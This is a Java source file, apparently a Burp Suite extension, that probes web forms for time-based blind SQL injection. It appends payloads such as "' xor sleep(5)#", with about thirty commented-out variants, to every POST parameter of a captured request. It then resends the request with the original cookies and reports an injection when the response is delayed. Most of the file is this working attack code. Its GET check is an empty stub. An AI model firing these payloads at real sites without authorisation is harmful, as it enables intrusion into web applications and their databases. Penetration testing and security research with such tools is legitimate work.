package sqlinject;

import java.util.List;
import org.apache.http.Header;
import org.omg.CORBA.PUBLIC_MEMBER;
import bsmali4.Bsmali4Post;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import java.util.HashMap;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Map;

public class SQLINJECT_BAKS {
	static List<String> payloads;
	static String cookies;
	static final int TIMEOUT = 5000;

	// 初始化payloads
	public static List<String> initpayload(boolean refresh) {
		if (refresh) {
			payloads = null;
		}
		if (payloads != null)
			return payloads;
		else {
			payloads = new ArrayList<String>();
			// payloads.add("' and sleep(20)");
			payloads.add("' xor sleep(5)#");
			/*
			 * payloads.add("' or sleep(20)"); payloads.add("' and sleep(20)#");
			 * payloads.add("' xor sleep(20)#");
			 * payloads.add("' or sleep(20)#");
			 * payloads.add("' and sleep(20)--");
			 * payloads.add("' xor sleep(20)--");
			 * payloads.add("' or sleep(20)--");
			 * payloads.add("') and sleep(20) or ('a'='a");
			 * payloads.add("') xor sleep(20) or ('a'='a");
			 * payloads.add("') and sleep(20) or ('a'='a");
			 * payloads.add("^sleep(20)^'"); payloads.add("'^sleep(20)^'");
			 * payloads.add("^sleep(20)#"); payloads.add("'^sleep(20)#");
			 * payloads.add("'^sleep(20)--"); payloads.add("^sleep(20)--");
			 * payloads.add("' or sleep(20) or '1'='1'--");
			 * payloads.add("' and sleep(20) or '1'='1'--");
			 * payloads.add("' xor sleep(20) or '1'='1'--");
			 * payloads.add("' or sleep(20) or ''='");
			 * payloads.add("\" or sleep(20) or \"\"=\"");
			 * payloads.add("\" sleep(20) or \"a\"=\"a");
			 * payloads.add("\" and sleep(20) or 1=1 --");
			 * payloads.add("' and sleep(20) or 1=1 --");
			 * payloads.add("' and sleep(20) or 'a'='a");
			 * payloads.add("') or sleep(20) or ('a'='a");
			 * payloads.add("\") or sleep(20) or (\"a\"=\"a");
			 * payloads.add("'admin' or sleep(20) or 'x'='x';");
			 */
			return payloads;
		}
	}

	// finally add header
	public static void addPostheader(List<String> headerStrings,
			Bsmali4Post httpPost) {
		for (String header : headerStrings) {
			if (header.contains(":")) {
				String[] headerArrayStrings = header.split(":");
				if (headerArrayStrings[0].trim().equals("User-Agent")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals("Accept")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals(
						"Accept-Language")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals(
						"Accept-Encoding")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals("Cookie")) {
					cookies = headerArrayStrings[1];
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				}
			}
		}
	}

	// 检查post注入
	public static void postData(List<String> headerStrings,
			List<IParameter> parameters, URL url, String payload,
			final PrintWriter stdout) throws InterruptedException {
		// 添加参数
		List<HttpParameter> temparrayparameters = new ArrayList<HttpParameter>();
		for (IParameter parameter : parameters) {
			if (!cookies.contains(parameter.getName())) {
				temparrayparameters.add(new HttpParameter(parameter.getName(),
						parameter.getValue()));
			}
		}
		final Bsmali4Post httpPost = new Bsmali4Post(url.toString());
		for (String header : headerStrings) {
			if (header.contains(":")) {
				String[] headerArrayStrings = header.split(":");
				if (headerArrayStrings[0].trim().equals("User-Agent")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals("Accept")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals(
						"Accept-Language")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals(
						"Accept-Encoding")) {
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				} else if (headerArrayStrings[0].trim().equals("Cookie")) {
					cookies = headerArrayStrings[1];
					httpPost.addHeader(headerArrayStrings[0],
							headerArrayStrings[1]);
				}
			}
		}
		for (int i = 0; i < temparrayparameters.size(); i++) {
			httpPost.addData(temparrayparameters.get(i).getKey(),
					temparrayparameters.get(i).getValue() + payload);
		}
		Thread thread1 = new Thread() {
			public void run() {
				httpPost.doPost();
			}
		};
		thread1.start();
		thread1.join();
		stdout.println("====");
		stdout.println(httpPost.getResContent());
		/*
		 * List<Thread> threadlist = new ArrayList<Thread>(); for (int i = 0; i
		 * < temparrayparameters.size(); i++) { final Bsmali4Post httpPost = new
		 * Bsmali4Post(url.toString()); for (int j = 0; j <
		 * temparrayparameters.size(); j++) { //httpPost = new
		 * Bsmali4Post(url.toString()); addPostheader(headerStrings,
		 * httpPost);// 增加头 if (i == j) {
		 * httpPost.addData(temparrayparameters.get(j).getKey(),
		 * temparrayparameters.get(j).getValue() + payload); } else {
		 * httpPost.addData(temparrayparameters.get(j).getKey(),
		 * temparrayparameters.get(j).getValue() + payload);
		 * 
		 * } } Thread thread = new Thread() { public void run() {
		 * httpPost.doPost(); }; }; thread.start(); thread.join();
		 * stdout.println(httpPost.getResContent()); //threadlist.add(thread); }
		 */

		// stdout.println(httpPost.getResContent());

	}

	public static void checkPostSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		for (String payload : payloads) {
			stdout.println(payload);
		}
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		for (String payload : payloads) {
			try {
				long startTime = System.currentTimeMillis();
				postData(headerStrings, parameters, url, payload, stdout);// postdata
				long endTime = System.currentTimeMillis();
				if ((endTime - startTime) > TIMEOUT) {
					stdout.println("===This is a sqlinject===");
					// 打印头和参数
					for (String header : headerStrings) {
						stdout.println(header);
					}
					for (IParameter parameter : parameters) {
						stdout.println(parameter.getName() + ":"
								+ parameter.getValue());
					}
				}
			} catch (Exception e) {
				stdout.println(e.getMessage());
			}
		}
	}

	public static void checkGetSqlinject(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		/* 初始化payload */
		initpayload(false);
		/* 构造，并且发送payload */
		List<String> headerStrings = new ArrayList<String>();
		List<IParameter> parameters = new ArrayList<IParameter>();
		headerStrings = helpers.analyzeRequest(baseRequestResponse)
				.getHeaders();
		parameters = helpers.analyzeRequest(baseRequestResponse)
				.getParameters();
		/* 发送get包 */

	}
}
